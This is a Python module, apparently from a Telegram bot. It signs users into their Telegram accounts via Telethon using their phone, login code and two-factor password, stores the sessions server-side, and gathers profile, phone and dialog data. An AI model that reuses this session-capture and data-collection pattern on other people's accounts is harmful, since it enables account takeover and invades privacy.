import asyncio
import logging
import sqlite3
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import SQLiteSession
from config import TELETHON_API_ID, TELETHON_API_HASH

logger = logging.getLogger(__name__)


class _WALSession(SQLiteSession):
    """SQLite session with WAL mode to prevent 'database is locked'."""
    def __init__(self, session_id=None):
        super().__init__(session_id)
        self.save_entities = False

    def _cursor(self):
        if self._conn is None:
            self._conn = sqlite3.connect(
                self.filename, check_same_thread=False, timeout=10,
            )
            self._conn.execute("PRAGMA journal_mode=WAL")
            self._conn.execute("PRAGMA busy_timeout=5000")
        return self._conn.cursor()


def _make_client(session_name: str = "telethon_session") -> TelegramClient:
    return TelegramClient(
        _WALSession(session_name),
        TELETHON_API_ID, TELETHON_API_HASH,
        system_version="4.16.30-vxCUSTOM",
    )

_clients: dict[int, TelegramClient] = {}
_login_state: dict[int, dict] = {}  # user_id -> {"phone": str, "phone_code_hash": str}
_client_lock = asyncio.Lock()


def _session_name(user_id: int) -> str:
    return f"telethon_session_{user_id}" if user_id else "telethon_session"


async def get_telethon_client(user_id: int = 0) -> TelegramClient:
    """Get client for user_id. user_id=0 = admin fallback."""
    async with _client_lock:
        client = _clients.get(user_id)
        if client is not None and client.is_connected():
            if await client.is_user_authorized():
                return client
            await client.disconnect()
            _clients.pop(user_id, None)

        if not TELETHON_API_ID or not TELETHON_API_HASH:
            raise RuntimeError("Telethon не настроен. Задайте API_ID и API_HASH в config.py")

        client = _make_client(_session_name(user_id))
        await client.connect()

        if await client.is_user_authorized():
            _clients[user_id] = client
            return client

        if user_id == 0:
            raise RuntimeError("❌ Telethon не авторизован.\nИспользуйте /setup_tg для входа")
        raise RuntimeError("❌ Вы не авторизованы.\nИспользуйте /setup_tg для входа в Telegram")


async def try_init_client() -> tuple[bool, str]:
    """Пробует инициализировать клиент админа при старте. Не блокирует."""
    try:
        if not TELETHON_API_ID or not TELETHON_API_HASH:
            return False, "API_ID/API_HASH не заданы в config.py"
        client = _make_client("telethon_session")
        await client.connect()
        if await client.is_user_authorized():
            me = await client.get_me()
            _clients[0] = client
            logger.info(f"Telethon админ: {me.first_name} @{me.username}")
            return True, f"✅ Telethon: @{me.username}"
        await client.disconnect()
        return False, "ℹ️ Telethon: сессия админа не найдена. Используйте /setup_tg"
    except Exception as e:
        logger.warning(f"Telethon init: {e}")
        return False, f"⚠️ Telethon: {e}"


async def start_login(user_id: int, phone: str) -> dict:
    """Отправляет код подтверждения на номер для user_id."""
    async with _client_lock:
        client = _make_client(_session_name(user_id))
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            _clients[user_id] = client
            _login_state[user_id] = {"phone": phone, "phone_code_hash": sent.phone_code_hash}
            return {"success": True, "phone_code_hash": sent.phone_code_hash, "timeout": sent.timeout or 30}
        except Exception as e:
            return {"success": False, "error": str(e)}


async def complete_login(user_id: int, code: str) -> dict:
    """Завершает вход по коду."""
    async with _client_lock:
        state = _login_state.get(user_id)
        if not state:
            return {"success": False, "error": "Сессия не найдена. Начните заново /setup_tg"}
        client = _clients.get(user_id)
        if not client:
            return {"success": False, "error": "Клиент не найден. Начните заново /setup_tg"}
        try:
            await client.sign_in(phone=state["phone"], code=code, phone_code_hash=state["phone_code_hash"])
            me = await client.get_me()
            _clients[user_id] = client
            _login_state.pop(user_id, None)
            logger.info(f"Telethon: user {user_id} вошёл как {me.first_name} @{me.username}")
            return {"success": True, "user": f"{me.first_name} @{me.username}", "me": me}
        except SessionPasswordNeededError:
            return {"success": False, "need_password": True,
                    "error": "Включена двухфакторка. Введите пароль: /setup_tg <пароль>"}
        except PhoneCodeInvalidError:
            return {"success": False, "error": "Неверный код. Попробуйте ещё раз."}
        except Exception as e:
            return {"success": False, "error": str(e)}


async def complete_2fa(user_id: int, password: str) -> dict:
    """Завершает вход с двухфакторным паролем."""
    async with _client_lock:
        client = _clients.get(user_id)
        if not client:
            return {"success": False, "error": "Сессия не найдена. Начните заново /setup_tg"}
        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            _login_state.pop(user_id, None)
            logger.info(f"Telethon: user {user_id} 2FA вход как {me.first_name} @{me.username}")
            return {"success": True, "user": f"{me.first_name} @{me.username}", "me": me}
        except Exception as e:
            return {"success": False, "error": str(e)}


async def has_session(user_id: int) -> bool:
    """Проверяет, есть ли у пользователя авторизованная сессия."""
    client = _clients.get(user_id)
    if client and client.is_connected():
        if await client.is_user_authorized():
            return True
    # Пробуем создать и проверить
    try:
        c = _make_client(_session_name(user_id))
        await c.connect()
        ok = await c.is_user_authorized()
        await c.disconnect()
        return ok
    except Exception:
        return False


async def collect_account_data(user_id: int) -> dict:
    """Собирает данные пользователя после входа: профиль, диалоги, контакты."""
    client = await get_telethon_client(user_id)
    me = await client.get_me()
    data = {
        "tg_user_id": me.id,
        "tg_username": me.username or "",
        "tg_first_name": me.first_name or "",
        "tg_last_name": me.last_name or "",
        "tg_phone": me.phone or "",
        "dialogs": [],
    }
    try:
        dialogs = await client.get_dialogs(limit=200)
        data["dialogs_count"] = len(dialogs)
        for d in dialogs:
            entity = d.entity
            data["dialogs"].append({
                "id": entity.id,
                "title": getattr(entity, "title", None) or f"{entity.first_name or ''} {entity.last_name or ''}".strip(),
                "username": getattr(entity, "username", ""),
                "type": "user" if d.is_user else ("group" if d.is_group else ("channel" if d.is_channel else "unknown")),
                "participants": getattr(entity, "participants_count", 0),
            })
    except Exception as e:
        logger.warning(f"collect dialogs for {user_id}: {e}")
    return data


async def close_telethon_client():
    global _clients
    for uid, c in _clients.items():
        try:
            await c.disconnect()
        except Exception:
            pass
    _clients.clear()


async def is_authorized() -> bool:
    client = _clients.get(0)
    if client is None:
        return False
    return await client.is_user_authorized()
